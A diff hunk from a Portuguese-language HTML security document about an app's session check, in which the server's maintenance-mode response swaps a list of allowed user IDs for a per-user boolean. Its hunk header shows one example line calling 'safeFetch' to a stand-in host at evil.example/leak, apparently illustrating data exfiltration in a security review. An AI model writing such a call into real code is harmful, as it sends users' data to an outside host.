@@ -196,8 +196,8 @@ await safeFetch('https://evil.example/leak', {
     <ol>
       <li><code>AuthContext</code> chama <code>/api/me/session</code> passando o ID token no header <code>Authorization: Bearer</code>.</li>
       <li>Server-side, <code>requireCorporateUser</code> verifica o token com Admin SDK e descobre o <code>email</code>.</li>
-      <li>O server le <code>systemSettings/admin_config</code> (ou fallback <code>config</code>) e decide se a pessoa e super admin. Retorna <code>{ isSuperAdmin, maintenanceMode, maintenanceMessage, allowedUserIds }</code>.</li>
-      <li>Se <code>maintenanceMode=true</code> e o usuario nao e super admin nem esta em <code>allowedUserIds</code>, o <code>AuthContext</code> faz <code>signOut</code> com toast "Manutencao".</li>
+      <li>O server le <code>systemSettings/admin_config</code> (ou fallback <code>config</code>) e decide se a pessoa e super admin. Retorna <code>{ isSuperAdmin, maintenanceMode, maintenanceMessage, isAllowedDuringMaintenance }</code>.</li>
+      <li>Se <code>maintenanceMode=true</code> e o usuario nao e super admin nem tem <code>isAllowedDuringMaintenance=true</code>, o <code>AuthContext</code> faz <code>signOut</code> com toast "Manutencao".</li>
     </ol>
     <div class="who">Fiscal: <code>/api/me/session</code> + <code>AuthContext</code></div>
   </div>
